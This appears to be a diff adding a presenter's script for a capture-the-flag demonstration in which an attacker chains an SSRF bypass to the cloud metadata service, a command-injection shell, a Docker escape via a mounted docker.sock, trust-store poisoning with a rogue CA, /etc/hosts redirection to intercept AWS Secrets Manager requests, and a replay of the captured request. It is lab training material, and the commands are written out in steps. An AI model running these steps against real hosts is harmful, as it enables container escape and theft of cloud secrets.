@@ -1,0 +1,73 @@
+# Insane AWS CTF: 
+
+This guide scripts the "God Mode" CTF demonstration, featuring a Docker Breakout and AWS Secrets Manager interception.
+
+**Target**: A high-security vault system protected by a containerized frontend and a hardened backend bot.
+
+---
+
+## Phase 1: The Breach (Web Application)
+
+**Narrative**: "Our target is the 'Secure Fetcher'. It claims to filter internal IP addresses. Let's verify."
+1.  **Probe**: Show the filters block standard attacks.
+2.  **Bypass**: Use the `redirect.py` trap to fool the application into contacting the internal metadata service.
+    *   *Result*: "We have credentials. But investigation reveals they are disjointed from the vault. We need deeper access."
+
+## Phase 2: The Escape (Docker)
+
+**Narrative**: "The application allows 'Diagnostic Pings'. We will upgrade our access using Command Injection."
+1.  **Inject**: `google.com; bash -i ...`
+    *   *Result*: "We have a shell. But `hostname` confirms we are trapped in a container."
+2.  **Breakout**: "We detect the `docker.sock` is mounted. We use it to spawn a 'Privileged Container' that mounts the Host OS."
+    ```bash
+    docker run -it -v /:/host ubuntu chroot /host bash
+    ```
+    *   *Result*: "We have escaped. We are now Root on the Datacenter Host."
+
+## Phase 3: The Interception (Secrets Manager)
+
+**Narrative**: "We control the host. A 'Secure Backup Bot' is running in the background, periodically fetching the Master Key from AWS Secrets Manager. It uses encrypted HTTPS."
+
+1.  **Recon**:
+    "The bot verifies certificates. We cannot simply spoof the DNS."
+    ```bash
+    ls -la /etc/pki/custom.pem
+    ```
+    "However, the Trust Store is writable. We will force the bot to trust US."
+
+2.  **Poisoning**:
+    "We generate a malicious Certificate Authority (CA) and inject it into the Trust Store."
+    ```bash
+    cat hacker_ca.pem >> /etc/pki/custom.pem
+    ```
+
+3.  **The Trap**:
+    "We redirect traffic for `secretsmanager.us-east-1.amazonaws.com` to our local listener."
+    ```bash
+    echo "127.0.0.1 secretsmanager.us-east-1.amazonaws.com" >> /etc/hosts
+    openssl s_server -cert fake.crt -key fake.key -port 443 -www
+    ```
+
+4.  **The Capture**:
+    "The bot wakes up. It sees our fake server. It checks the Trust Store... and TRUSTS our certificate."
+    *   *Action*: The request appears in the terminal.
+    *   *Highlight*: Point to the `Authorization` header and the `{"SecretId": "..."}` body.
+
+## Phase 4: The Vault
+
+**Narrative**: "We have the Key. We have the ID. We now become the Bot."
+
+1.  **Replay**:
+    Execute the logical equivalent of the captured request against the *REAL* endpoint.
+    ```bash
+    curl -X POST https://secretsmanager.us-east-1.amazonaws.com/ \
+      -H "Authorization: ..." \
+      -H "X-Amz-Target: secretsmanager.GetSecretValue" \
+      -d '{"SecretId": "..."}'
+    ```
+2.  **Victory**:
+    The JSON response contains the Flag.
+    `"SecretString": "flag{s3cr3ts_m4n4g3r_1nt3rc3pt10n_m4st3r}"`
+
+---
+**Demonstration Complete.**
